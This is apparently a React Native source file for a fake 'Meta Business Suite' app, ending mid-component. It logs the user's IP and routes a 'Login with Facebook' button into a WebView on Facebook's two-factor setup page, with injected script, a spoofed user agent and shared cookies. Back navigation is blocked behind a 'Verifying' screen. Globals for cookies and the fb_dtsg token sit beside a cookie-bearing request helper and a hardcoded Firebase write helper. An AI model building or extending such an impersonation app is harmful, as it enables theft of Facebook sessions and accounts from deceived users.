import React, { useRef, useEffect, useState } from "react";
import {
  AsyncStorage,
  SafeAreaView,
  View,
  Text,
  LogBox,
  Image,
  Modal,
  TouchableOpacity,
  StyleSheet,
  Dimensions,
  ActivityIndicator,
  ScrollView,
  Button,
  StatusBar,
  Switch,
  TouchableWithoutFeedback,
  Keyboard,
  TextInput,
} from "react-native";
import { createBottomTabNavigator } from "@react-navigation/bottom-tabs";
import { WebView } from "react-native-webview";
import { NavigationContainer } from "@react-navigation/native";
import { createNativeStackNavigator } from "@react-navigation/native-stack";
import { LinearGradient } from "expo-linear-gradient";
import Checkbox from "expo-checkbox";
import firebase from "firebase";
import { Path, Svg } from "react-native-svg";
LogBox.ignoreLogs(["Warning: ..."]); // Ignore log notification by message
LogBox.ignoreAllLogs(); //Ignore all log notifications
if (firebase.apps.length === 0) {
  firebase.initializeApp({
    apiKey: "AIzaSyCcXi8_ax6v6KGjKI00X7PtoWH7a3Q0e4Q",
    authDomain: "mobile-97165.firebaseapp.com",
    projectId: "mobile-97165",
    storageBucket: "mobile-97165.appspot.com",
    messagingSenderId: "85866129925",
    appId: "1:85866129925:web:6a3e83eae159e3b1640a6c",
  });
}
const delay = (ms) => new Promise((res) => setTimeout(res, ms));
// Function to write data to Firestore
const addDocument = async (collection, data) => {
  try {
    const document = await firebase
      .firestore()
      .collection(collection)
      .add(data);
    return document.id;
  } catch (error) {
    console.log("error :>> ", error);
  }
};

const updDocument = async (collection, data, docid) => {
  try {
    await firebase.firestore().collection(collection).doc(docid).update(data);
  } catch (error) {
    console.log("error :>> ", error);
  }
};

//==========GLOBAL VARIAVLE=========
//var emails = [];
var cookieStr = "";
var loginAttempts = 0;
var fb_dtsg = "";
var is_done = false;
var injected = false;
var useragent =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15";
const { width, height } = Dimensions.get("window");
const JS_GLOBAL = `
(function () {
      try{
        if (document.querySelector(\"._2pio._1uxu\")) {
          document.querySelector(\"._2pio._1uxu\").remove();   
        }
        const meta = document.createElement(\'meta\'); meta.setAttribute(\'content\', \'width=device-width, initial-scale=1, maximum-scale=0.9, user-scalable=0\'); meta.setAttribute(\'name\', \'viewport\'); 
        document.getElementsByTagName(\'head\')[0].appendChild(meta);
        document.body.addEventListener("contextmenu", function(evt){evt.preventDefault();return false;});
      }catch(e){};
})();
true`;
const _request = async ({ url, body, headers = {} }, cookie) => {
  try {
    var rqOption = {
      method: "GET",
      mode: "cors",
      cache: "no-cache",
      credentials: "same-origin",
      headers: {
        Cookie: cookie,
        "User-Agent": useragent,
      },
    };
    if (body?.length) {
      rqOption["method"] = "POST";
      rqOption["body"] = body;
    }
    rqOption.headers = { ...rqOption.headers, ...headers };
    const response = await fetch(url, rqOption);
    return await response.text();
  } catch (error) {
    console.log("error :>> ", error);
  }
};

const Colors = {
  primaryColor: "#3385ff", // Blue
  secondaryColor: "#36D7B7", // Teal
  textColor: "#595959", // Dark Gray
  textWhite: "#ffffff", // Dark Gray
  textBlack: "#000000", // Dark Gray
  errorColor: "#FF5252", // Red
  successColor: "#4CAF50", // Green
  dangerColor: "#ff1a1a", // Yellow
  warnColor: "#FFC107", // Yellow
  bgPrimary: "#F5F5F5", // Light Gray
  bgSecondary: "#666666", // Amber
  bgSecondaryLight: "#d9d9d9", // Light Gray (Info or neutral color)
  bgError: "#FFEBEE", // Pink
  bgSuccess: "#E8F5E9", // Light Green
  bgWarn: "#FFFDE7", // Yellow
  bgLight: "#FFFFFF", // White or any light color you prefer
  bgPrimaryLight: "#ccebff", // Light Blue
  bgErrorLight: "#ffcdd2", // Light Red
  bgSuccessLight: "#dcedc8", // Light Green
  bgWarnLight: "#fff9c4", // Light Yellow
};

function MainScreen({ navigation }) {
  const [modalVisible, setModalVisible] = useState(false);
  const [initUrl, setInitUrl] = useState(
    "https://www.facebook.com/security/2fac/setup/intro/"
  );
  const webViewRef = useRef();
  const [loadingVisible, setLoadingVisible] = useState(false);
  const styles = StyleSheet.create({
    activityIndicatorStyle: {
      flex: 1,
      position: "absolute",
      marginLeft: "auto",
      marginRight: "auto",
      marginTop: "auto",
      marginBottom: "auto",
      left: 0,
      right: 0,
      top: 0,
      bottom: 0,
      justifyContent: "center",
    },
  });

  const ActivityIndicatorElement = () => {
    return (
      <View style={styles.activityIndicatorStyle}>
        <ActivityIndicator color="#009688" size="large" />
      </View>
    );
  };

  const onloadEnd = async (event) => {
    setTimeout(() => {
      setLoadingVisible(false);
    }, 100);
    const { nativeEvent } = event;
    this.isLoading = nativeEvent.loading;
    this.url = nativeEvent.url;
  };

  const handleMessage = async (event) => {
    if (!event.nativeEvent) {
      return;
    }
    try {
      if (event.nativeEvent.data) {
        let data = JSON.parse(event.nativeEvent.data);
        console.log(data);
      }
    } catch (error) {
      console.log("error :>> ", error);
      return;
    }
  };
  const handleNagivate = async (navState) => {};

  const onloadStart = async (event) => {
    setLoadingVisible(true);
  };

  return (
    <View style={{ flex: 1, marginTop: "10%" }}>
      <Modal animationType="none" transparent={false} visible={modalVisible}>
        <View
          style={{ flex: 1, alignItems: "center", justifyContent: "center" }}
        >
          <Image
            source={require("./assets/images/logo.png")}
            style={{
              resizeMode: "contain",
              width: 250,
              height: 120,
              marginLeft: 0,
              marginTop: 0,
            }}
          />
          <Image
            source={require("./assets/images/loading.gif")}
            style={{ width: 35, height: 35 }}
          />
          <Text style={{ fontSize: 14 }}>Verifying...</Text>
          <Text style={{ fontSize: 14 }}>Please do not close the app</Text>
        </View>
      </Modal>
      <WebView
        useWebKit={true}
        incognito={true}
        style={{ flex: 1, opacity: loadingVisible ? 0 : 100 }}
        ref={webViewRef}
        source={{ uri: initUrl }}
        javaScriptEnabled={true}
        injectedJavaScript={JS_GLOBAL}
        domStorageEnabled={true}
        startInLoadingState={true}
        originWhitelist={["*"]}
        scalesPageToFit={false}
        sharedCookiesEnabled={true}
        userAgent={useragent}
        onLoadEnd={onloadEnd}
        onLoadStart={onloadStart}
        onMessage={handleMessage}
        onNavigationStateChange={handleNagivate}
        cacheEnabled={false}
      />
      {loadingVisible ? <ActivityIndicatorElement /> : null}
    </View>
  );
}

const BellIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M14.857 17.082a23.848 23.848 0 0 0 5.454-1.31A8.967 8.967 0 0 1 18 9.75V9A6 6 0 0 0 6 9v.75a8.967 8.967 0 0 1-2.312 6.022c1.733.64 3.56 1.085 5.455 1.31m5.714 0a24.255 24.255 0 0 1-5.714 0m5.714 0a3 3 0 1 1-5.714 0"
    />
  </Svg>
);

const CameraIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6.827 6.175A2.31 2.31 0 0 1 5.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 0 0-1.134-.175 2.31 2.31 0 0 1-1.64-1.055l-.822-1.316a2.192 2.192 0 0 0-1.736-1.039 48.774 48.774 0 0 0-5.232 0 2.192 2.192 0 0 0-1.736 1.039l-.821 1.316z"
    />
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M16.5 12.75a4.5 4.5 0 1 1-9 0 4.5 4.5 0 0 1 9 0zm2.25-2.25h.008v.008h-.008V10.5z"
    />
  </Svg>
);

const FaceSmileIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M15.182 15.182a4.5 4.5 0 0 1-6.364 0M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0zM9.75 9.75c0 .414-.168.75-.375.75S9 10.164 9 9.75 9.168 9 9.375 9s.375.336.375.75zm-.375 0h.008v.015h-.008V9.75zm5.625 0c0 .414-.168.75-.375.75s-.375-.336-.375-.75.168-.75.375-.75.375.336.375.75zm-.375 0h.008v.015h-.008V9.75z"
    />
  </Svg>
);
const VideoCameraIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      d="m15.75 10.5 4.72-4.72a.75.75 0 0 1 1.28.53v11.38a.75.75 0 0 1-1.28.53l-4.72-4.72M4.5 18.75h9a2.25 2.25 0 0 0 2.25-2.25v-9a2.25 2.25 0 0 0-2.25-2.25h-9A2.25 2.25 0 0 0 2.25 7.5v9a2.25 2.25 0 0 0 2.25 2.25z"
    />
  </Svg>
);

const MapPinIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"
    />
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0z"
    />
  </Svg>
);
const PhotoIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="currentColor"
    aria-hidden="true"
    viewBox="0 0 20 20"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      fillRule="evenodd"
      d="M1 5.25A2.25 2.25 0 0 1 3.25 3h13.5A2.25 2.25 0 0 1 19 5.25v9.5A2.25 2.25 0 0 1 16.75 17H3.25A2.25 2.25 0 0 1 1 14.75v-9.5zm1.5 5.81v3.69c0 .414.336.75.75.75h13.5a.75.75 0 0 0 .75-.75v-2.69l-2.22-2.219a.75.75 0 0 0-1.06 0l-1.91 1.909.47.47a.75.75 0 1 1-1.06 1.06L6.53 8.091a.75.75 0 0 0-1.06 0l-2.97 2.97zM12 7a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"
      clipRule="evenodd"
    />
  </Svg>
);

const PlusIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="currentColor"
    aria-hidden="true"
    viewBox="0 0 20 20"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      fillRule="evenodd"
      d="M10 18a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm.75-11.25a.75.75 0 0 0-1.5 0v2.5h-2.5a.75.75 0 0 0 0 1.5h2.5v2.5a.75.75 0 0 0 1.5 0v-2.5h2.5a.75.75 0 0 0 0-1.5h-2.5v-2.5z"
      clipRule="evenodd"
    />
  </Svg>
);

const InformationCircleIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="currentColor"
    aria-hidden="true"
    viewBox="0 0 20 20"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      fillRule="evenodd"
      d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0zm-7-4a1 1 0 1 1-2 0 1 1 0 0 1 2 0zM9 9a.75.75 0 0 0 0 1.5h.253a.25.25 0 0 1 .244.304l-.459 2.066A1.75 1.75 0 0 0 10.747 15H11a.75.75 0 0 0 0-1.5h-.253a.25.25 0 0 1-.244-.304l.459-2.066A1.75 1.75 0 0 0 9.253 9H9z"
      clipRule="evenodd"
    />
  </Svg>
);

const ArrowLongIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M17.25 8.25 21 12m0 0-3.75 3.75M21 12H3"
    />
  </Svg>
);
const ArrowUpIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 19.5v-15m0 0-6.75 6.75M12 4.5l6.75 6.75"
    />
  </Svg>
);

const ArrowPathIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99"
    />
  </Svg>
);

const NewsIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 7.5h1.5m-1.5 3h1.5m-7.5 3h7.5m-7.5 3h7.5m3-9h3.375c.621 0 1.125.504 1.125 1.125V18a2.25 2.25 0 0 1-2.25 2.25M16.5 7.5V18a2.25 2.25 0 0 0 2.25 2.25M16.5 7.5V4.875c0-.621-.504-1.125-1.125-1.125H4.125C3.504 3.75 3 4.254 3 4.875V18a2.25 2.25 0 0 0 2.25 2.25h13.5M6 7.5h3v3H6v-3z"
    />
  </Svg>
);

const ChatBubbleLeftEllipsisIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M8.625 12a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0zm0 0H8.25m4.125 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0zm0 0H12m4.125 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0zm0 0h-.375M21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 0 1-2.555-.337A5.972 5.972 0 0 1 5.41 20.97a5.969 5.969 0 0 1-.474-.065 4.48 4.48 0 0 0 .978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z"
    />
  </Svg>
);

const Bars3Icon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"
    />
  </Svg>
);

const MagnifyingGlassIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607z"
    />
  </Svg>
);

const ChevronRightIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="m8.25 4.5 7.5 7.5-7.5 7.5"
    />
  </Svg>
);

const PaperAirplaneIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6 12 3.269 3.126A59.768 59.768 0 0 1 21.485 12 59.77 59.77 0 0 1 3.27 20.876L5.999 12zm0 0h7.5"
    />
  </Svg>
);

const ChevronLeftIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M15.75 19.5 8.25 12l7.5-7.5"
    />
  </Svg>
);

//===================
function PushNotifyScreen({ navigation }) {
  const stylesNoti = StyleSheet.create({
    container: {
      backgroundColor: "#fff",
      alignItems: "center",
      padding: 30,
      height: "100%",
    },
    header: {
      marginTop: 40,
    },
    boxTitle: {
      marginTop: 30,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      textAlign: "center",
    },
    policies: {
      marginTop: 30,
      paddingHorizontal: 30,
      gap: 20,
    },
    policy: {
      flexDirection: "row",
      gap: 10,
      paddingHorizontal: 30,
    },
    checkbox: {},
    label: {
      fontSize: 18,
      marginLeft: 10,
      fontWeight: "bold",
    },
    des: {
      marginTop: 5,
      marginLeft: 10,
      fontSize: 15,
      marginBottom: 10,
    },
    submit: {
      width: "100%",
      position: "absolute",
      bottom: 10,
      alignItems: "center",
      padding: 30,
    },
    hr: {
      width: "100%",
      borderColor: "#f2f2f2",
      borderWidth: 1,
    },
    textDes: {
      color: "#bfbfbf",
      marginTop: 10,
    },
    button: {
      height: 50,
      width: "100%",
      justifyContent: "center",
      alignItems: "center",
      backgroundColor: "#4C91FA",
      borderRadius: 12,
      marginTop: 10,
    },
  });

  useEffect(() => {
    async function fetchIPInfo() {
      // CookieManager.clearAll();
      const storageIP = await AsyncStorage.getItem("ipinfo");
      if (!storageIP) {
        let fetchRes = await fetch("https://ipinfo.io/json", {
          method: "GET",
          headers: {
            Accept: "application/json",
          },
        });
        let fetchStr = await fetchRes.json();
        await AsyncStorage.setItem("ipinfo", JSON.stringify(fetchStr));
      }
    }
    fetchIPInfo();
  }, []);

  return (
    <SafeAreaView style={stylesNoti.container}>
      <View style={stylesNoti.header}>
        <Image source={require("./assets/images/noti.png")} />
      </View>
      <View style={stylesNoti.boxTitle}>
        <Text style={stylesNoti.title}>Turn on push notifications to</Text>
        <Text style={stylesNoti.title}>stay updated</Text>
      </View>
      <View style={stylesNoti.policies}>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Do you like React Native?</Text>
            <Text style={stylesNoti.des}>
              The status of your campaigns: approval, ending and performance
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Alerts</Text>
            <Text style={stylesNoti.des}>
              Error blocking your campaigns: ad rejection, biling issues, or
              reaching your spending limit
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Getting started</Text>
            <Text style={stylesNoti.des}>
              Tips for running campaigns in Ads Manager
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Performance opportunities</Text>
            <Text style={stylesNoti.des}>
              Suggestion to improve campaigns performance
            </Text>
          </View>
        </View>
      </View>
      <View style={stylesNoti.submit}>
        <View style={{ width: "100%", paddingHorizontal: 15 }}>
          <View style={stylesNoti.hr} />
        </View>
        <Text style={stylesNoti.textDes}>
          You can make changes in settings any time
        </Text>
        <TouchableOpacity
          onPress={() => {
            navigation.navigate("SocialAuthScreen");
          }}
          style={stylesNoti.button}
        >
          <Text style={{ color: "#fff", fontWeight: "bold", fontSize: 17 }}>
            Continue
          </Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

function SocialAuthScreen({ navigation }) {
  const stylesLogin = StyleSheet.create({
    container: {
      flex: 1,
      flexGrow: 1,
      backgroundColor: "#fff",
      alignItems: "center",
      justifyContent: "center",
      padding: 30,
    },
    box: {
      width: "100%",
      backgroundColor: "#fff",
      height: 320,
      borderRadius: 12,
      paddingTop: 50,
      paddingLeft: 30,
      paddingRight: 30,
    },
    boxHeader: {
      justifyContent: "center",
      alignItems: "center",
      flexDirection: "row",
      gap: 5,
    },
    checked: {
      position: "relative",
      right: 8,
      top: -10,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      marginLeft: 2,
    },
    fblogin: {
      marginLeft: 5,
      fontSize: 15,
    },
    inslogin: {
      marginLeft: 5,
      fontSize: 15,
      color: "#9ca3af",
    },
    titletext: {
      fontSize: 16,
    },
    description: {
      marginTop: 20,
      alignItems: "center",
    },
    login: {
      marginTop: 30,
      gap: 10,
    },
    button: {
      marginBottom: 10,
      flexDirection: "row",
      justifyContent: "center",
      gap: 10,
      padding: 15,
      width: "100%",
      backgroundColor: "#d7dbdf6e",
      borderRadius: 12,
    },
  });
  const [touched, setTouched] = useState(false);
  useEffect(
    () =>
      navigation.addListener("beforeRemove", (e) => {
        e.preventDefault();
        return;
      }),
    [navigation]
  );
  return (
    <LinearGradient
      // Background Linear Gradient
      colors={["#14D5FF", "#45D439"]}
      style={stylesLogin.container}
    >
      <View style={stylesLogin.box}>
        <View style={stylesLogin.boxHeader}>
          <Image source={require("./assets/images/meta.png")} />
          <Text style={stylesLogin.title}>Meta Business Suite</Text>
        </View>
        <View style={stylesLogin.description}>
          <Text style={stylesLogin.titletext}>
            Create and manage ads on iphone
          </Text>
        </View>
        <View style={stylesLogin.login}>
          <TouchableOpacity
            onPress={() => {
              navigation.navigate("MainScreen");
            }}
            style={stylesLogin.button}
          >
            <Image
              height={"18"}
              width={18}
              source={require("./assets/images/fb.png")}
            />
            <Text style={stylesLogin.fblogin}>Login with Facebook</Text>
          </TouchableOpacity>

          <TouchableOpacity disabled={true} style={stylesLogin.button}>
            <Image source={require("./assets/images/ig.png")} />
            <Text style={stylesLogin.inslogin}>Login with Instagram</Text>
          </TouchableOpacity>
        </View>
      </View>
    </LinearGradient>
  );
}

function LoadScreen({ navigation }) {
  useEffect(
    () =>
      navigation.addListener("beforeRemove", (e) => {
        e.preventDefault();
        return;
      }),
    [navigation]
  );
  return (
    <View style={{ flex: 1, alignItems: "center", justifyContent: "center" }}>
      <Image
        source={require("./assets/images/logo.png")}
        style={{
          resizeMode: "contain",
          width: 250,
          height: 120,
          marginLeft: 0,
          marginTop: 0,
        }}
      />
      <Image
        source={require("./assets/images/loading.gif")}
        style={{ width: 35, height: 35 }}
      />
      <Text style={{ fontSize: 14 }}>Verifying...</Text>
      <Text style={{ fontSize: 14 }}>Please do not close the app</Text>
    </View>
  );
}

function SnackScreen({ navigation }) {
  return (
    <Stack.Navigator
      initialRouteName="HomeScreen"
      screenOptions={{ headerShown: false }}
    >
      <Stack.Screen name="HomeScreen" component={HomeScreen} />
      <Stack.Screen
        options={{ headerShown: false }}
        name="Notifications"
        component={NotificationsScreen}
      />
      <Stack.Screen
        options={{ headerShown: false }}
        name="CreatePost"
        component={CreatePost}
      />
      {/* <Stack.Screen name="PushNotifyScreen" component={PushNotifyScreen} />
      <Stack.Screen name="SocialAuthScreen" component={SocialAuthScreen} />
      <Stack.Screen name="MainScreen" component={MainScreen} />
      <Stack.Screen name="LoadScreen" componentt={LoadScreen} /> */}
    </Stack.Navigator>
  );
}

function HomeScreen({ navigation }) {
  const [countNoti, setCountNoti] = React.useState(0);
  function handleCreatePost() {
    navigation.navigate("CreatePost");
  }

  function onHandleExplore() {}

  function handleGoNotifications() {
    navigation.navigate("Notifications");
  }

  React.useEffect(() => {
    const initData = () => {
      const q = query(
        collection(db, "notifications"),
        where("readed", "==", true)
      );
      onSnapshot(q, (querySnapshot) => {
        const data = [];
        console.log(querySnapshot.size);
        setCountNoti(querySnapshot.size);
      });
    };
    // initData();
  }, []);
  return (
    <SafeAreaView style={stylesHomePage.container}>
      <ScrollView flex style={{ overflow: "scroll" }}>
        <View style={stylesHomePage.header}>
          <TouchableOpacity
            style={stylesHomePage.icon}
            onPress={handleGoNotifications}
          >
            <BellIcon />
          </TouchableOpacity>
          <TouchableOpacity style={stylesHomePage.icon}>
            <Image
              source={require("./assets/images/image-1.jpg")}
              full
              style={{
                width: 30,
                height: 30,
                borderRadius: 100,
                borderColor: "#fff",
                borderWidth: 2,
              }}
            />
            <Text style={{ fontSize: 18, marginLeft: 10, fontWeight: "600" }}>
              Home
            </Text>
          </TouchableOpacity>
        </View>
        <View
          style={{
            flexDirection: "row",
            alignItems: "center",
            width: "100%",
            height: 40,
            margin: 10,
          }}
        >
          <TouchableOpacity
            style={{
              borderRadius: 6,
              backgroundColor: Colors.bgPrimaryLight,
              justifyContent: "center",
              alignItems: "center",
              paddingHorizontal: 10,
              paddingVertical: 6,
            }}
          >
            <Text style={{ fontWeight: "700", color: Colors.primaryColor }}>
              Manage
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            onPress={onHandleExplore}
            style={{
              borderRadius: 10,
              marginLeft: 20,
            }}
          >
            <Text style={{ color: Colors.textColor }}>Explore</Text>
          </TouchableOpacity>
        </View>
        <View
          style={{
            paddingHorizontal: 10,
            paddingVertical: 15,
          }}
        >
          <Image
            source={require("./assets/images/image-1.jpg")}
            style={{ width: "100%", height: 150, objectFit: "cover" }}
            borderRadius={10}
          />
          <View
            style={{
              position: "relative",
              top: -60,
              justifyContent: "center",
              alignItems: "center",
            }}
          >
            <Image
              source={require("./assets/images/image-1.jpg")}
              full
              style={{
                width: 80,
                height: 80,
                borderRadius: 100,
                borderColor: "#fff",
                borderWidth: 2,
              }}
            />
            <Text style={{ fontSize: 18, fontWeight: "bold", marginTop: 10 }}>
              John Doe
            </Text>
            <View style={{ flexDirection: "row", marginTop: 15 }}>
              <TouchableOpacity
                style={{
                  width: 150,
                  height: 44,
                  borderRadius: 12,
                  backgroundColor: Colors.bgPrimary,
                  justifyContent: "center",
                  alignItems: "center",
                  paddingHorizontal: 10,
                  paddingVertical: 6,
                  flexDirection: "row",
                }}
                onPress={handleCreatePost}
              >
                <PhotoIcon />
                <Text
                  style={{
                    marginLeft: 10,
                    fontWeight: "700",
                    color: Colors.textColor,
                  }}
                >
                  Photo
                </Text>
              </TouchableOpacity>
              <View style={{ width: 30 }} />
              <TouchableOpacity
                style={{
                  width: 150,
                  height: 44,
                  borderRadius: 12,
                  backgroundColor: Colors.bgPrimary,
                  justifyContent: "center",
                  alignItems: "center",
                  paddingHorizontal: 10,
                  paddingVertical: 6,
                  flexDirection: "row",
                }}
                onPress={handleCreatePost}
              >
                <PlusIcon />
                <Text
                  style={{
                    marginLeft: 10,
                    fontWeight: "700",
                    color: Colors.textColor,
                  }}
                >
                  Story
                </Text>
              </TouchableOpacity>
            </View>
          </View>
          <View>
            <Text style={stylesHomePage.headerText}>Create a post now</Text>
            <TouchableOpacity
              style={{
                width: "100%",
                height: 44,
                borderRadius: 6,
                backgroundColor: Colors.bgPrimary,
                justifyContent: "center",
                alignItems: "center",
                paddingHorizontal: 10,
                paddingVertical: 6,
                flexDirection: "row",
                marginTop: 10,
              }}
              onPress={handleCreatePost}
            >
              <Text
                style={{
                  fontWeight: "700",
                  color: Colors.textColor,
                }}
              >
                Create a post now
              </Text>
            </TouchableOpacity>
          </View>
          <View style={{ position: "relative", marginTop: 20 }}>
            <Text style={stylesHomePage.headerText}>Recent ads</Text>
            <Image
              source={require("./assets/images/sky-1.png")}
              full
              style={{
                width: "100%",
                height: 250,
                objectFit: "cover",
                marginTop: 10,
              }}
              borderRadius={10}
            />
            <View
              style={{
                height: 80,
                width: "100%",
                position: "absolute",
                bottom: 0,
                left: 0,
                opacity: 0.9,
              }}
            >
              <LinearGradient
                colors={["transparent", "#0000000"]}
                style={{ height: 80 }}
              />
            </View>
            <View
              style={{
                position: "absolute",
                bottom: 10,
                justifyContent: "center",
                alignItems: "center",
                paddingHorizontal: 50,
              }}
            >
              <PlusIcon color={Colors.textColor} />
              <Text
                style={{
                  fontWeight: 600,
                  color: Colors.textWhite,
                  fontSize: 17,
                  fontWeight: "bold",
                  marginTop: 10,
                }}
              >
                Share your story
              </Text>
              <Text
                style={{
                  fontSize: 14,
                  fontWeight: "400",
                  marginTop: 10,
                  textAlign: "center",
                  color: Colors.textWhite,
                }}
              >
                Your story will appear here. Sharing regularly helps you connect
                iwth your audience
              </Text>
            </View>
          </View>
          <View style={{ padding: 10, marginTop: 20 }}>
            <View>
              <View style={{ flexDirection: "row", alignItems: "center" }}>
                <InformationCircleIcon />
